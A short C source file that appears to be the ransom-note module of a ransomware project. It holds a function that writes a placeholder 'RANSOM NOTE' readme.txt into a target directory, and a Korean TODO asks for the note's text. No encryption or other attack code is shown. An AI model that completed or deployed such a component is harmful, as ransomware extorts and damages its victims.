#include "readme.h"
#include <stdio.h>
#include <string.h>

/*
 * README_CONTENT
 *
 * TODO:
 *  - 아래 문자열에 readme.txt에 들어갈 내용 작성.
 */
static const char *README_CONTENT =
"***************************************\n"
"*   RANSOM NOTE   *\n"
"***************************************\n"
"\n";

int write_readme(const char *target_dir)
{
    char path[1024];

    if (snprintf(path, sizeof(path), "%s/readme.txt", target_dir)
        >= (int)sizeof(path)) {
        fprintf(stderr, "[README] path too long\n");
        return -1;
    }

    FILE *fp = fopen(path, "w");
    if (!fp) {
        perror("[README] fopen");
        return -1;
    }

    fputs(README_CONTENT, fp);
    fclose(fp);

    printf("[README] created: %s\n", path);
    return 0;
}

